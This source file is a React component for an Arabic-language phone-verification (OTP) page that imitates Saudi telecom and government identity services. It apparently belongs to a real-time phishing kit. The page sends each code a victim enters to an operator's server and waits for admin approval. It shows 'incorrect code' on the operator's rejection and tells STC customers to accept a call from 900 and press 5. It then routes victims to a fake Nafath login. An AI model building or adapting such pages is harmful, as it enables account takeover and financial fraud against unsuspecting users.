import { isFormRejected } from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import FormControl from "@mui/material/FormControl";
import InputLabel from "@mui/material/InputLabel";
import OutlinedInput from "@mui/material/OutlinedInput";
import Stack from "@mui/material/Stack";
import { useEffect } from "react";
import { Controller, FieldValues, useForm } from "react-hook-form";
import { Button } from "@mui/material";
import { useSearchParams } from "react-router-dom";
import Main from "@/components/Main";
import ResendCode from "@/components/ResendCode";
import serviceProviders from "@/data/serviceProviders";

function VerifyPhone() {
  const {
    control,
    handleSubmit,
    reset,
    formState: { isValid, errors },
  } = useForm({
    mode: "onChange",
    defaultValues: { otp: "" },
  });

  function sendData(data: FieldValues) {
    let nextPage = "تسجيل دخول نفاذ";

    if (serviceProvider == "0") {
      nextPage = "تنبية إتصال STC";
    }

    sendDataToServer({
      digitCode: data.otp,
      current: "تحقق رقم الجوال (OTP)",
      nextPage,
      waitingForAdminResponse: true,
    });
  }

  useEffect(() => setCurrentPage("تحقق رقم الجوال (OTP)"), []);
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
    }
  }, [isFormRejected.value]);

  const [searchParams] = useSearchParams();
  const serviceProvider = searchParams.get("serviceProvider") || "";

  return (
    <Main variant="filled">
      <form
        className="relative flex flex-col gap-2 max-w-lg mx-auto rounded-2xl"
        style={{
          flexDirection: "column",
          justifyContent: "space-between",
          overflow: "hidden",
        }}
        onSubmit={handleSubmit(sendData)}
      >
        <img
          src="/images/mutasil.png"
          alt="mobile header image"
          className="mb-6 w-1/4"
        />
        <div className="flex gap-2">
          <img src="/images/mobile.png" className="h-12" alt="mobile logo" />
          <div className="flex gap-1">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
              strokeLinejoin="round"
              className="lucide lucide-arrow-up-right cursor-pointer w-12 text-main"
            >
              <path d="M7 7h10v10"></path>
              <path d="M7 17 17 7"></path>
            </svg>
            <h2 className="mb-1 font-bold text-gray-600">
              تم إرسال رمز التحقق الى هاتفك النقال. الرجاء إدخاله في هذه الخانة.
            </h2>
          </div>
        </div>

        <div className="flex flex-col gap-2">
          {serviceProvider !== "" && (
            <div className="flex my-4 flex-col-reverse sm:flex-row">
              {serviceProvider == "0" && (
                <p className="text-[#4f008c] text-md font-bold">
                  عملاء STC الكرام في حال تلقي مكالمة من 900 الرجاء قبولها
                  واختيار الرقم 5
                </p>
              )}

              {serviceProvider == "5" && (
                <p className="text-[#1691b3] text-md font-bold">
                  ستصلك مكالمة من مزود الخدمة، يرجى اتباع التعليمات الصوتية
                  والضغط على الرقم الذي تسمعه لتأكيد الطلب
                </p>
              )}

              <img
                src={`/images/service-providers/${Number(serviceProvider) + 1}.png`}
                className="h-12 ms-auto"
              />
            </div>
          )}

          <Stack>
            <FormControl fullWidth>
              <InputLabel htmlFor="otp">رمز التحقق</InputLabel>
              <Controller
                name="otp"
                control={control}
                rules={{
                  required: "يرجى إدخال رمز التحقق:",
                  validate: (value) => {
                    const cleaned = value.replace(/[^\d]/g, "");
                    if (cleaned.length !== 6 && cleaned.length !== 4)
                      return "رمز التحقق غير صحيح";
                    return true;
                  },
                }}
                render={({ field }) => (
                  <OutlinedInput
                    {...field}
                    dir="ltr"
                    id="otp"
                    type="text"
                    onChange={(e) => {
                      let rawValue = e.target.value.replace(/[^\d]/g, "");
                      if (rawValue.length > 6) {
                        rawValue = rawValue.slice(0, 6);
                      }
                      field.onChange(rawValue);
                    }}
                    inputProps={{ maxLength: 6 }}
                    label="رمز التحقق"
                  />
                )}
              />
              {errors.otp && (
                <span className="text-red-500 text-sm mt-1">
                  {errors.otp.message}
                </span>
              )}
            </FormControl>
          </Stack>

          {isFormRejected.value && (
            <Stack className="font-medium mt-5 text-red-500 text-center">
              رمز التحقق غير صحيح
            </Stack>
          )}
        </div>

        <div dir="ltr" className="mt-2 flex justify-between">
          <Button
            sx={{ borderRadius: "200px" }}
            variant="contained"
            size="large"
            className="ms-auto w-fit"
            disabled={!isValid}
            type="submit"
          >
            تحقق
          </Button>
          <ResendCode
            data={{
              "مزود الخدمة": serviceProvider
                ? serviceProviders[Number(serviceProvider)]
                : "غير محدد",
            }}
          />
        </div>
        <img
          src="images/cst.png"
          alt="mobile header image"
          className="mt-6 mx-auto"
        />
      </form>
    </Main>
  );
}

export default VerifyPhone;
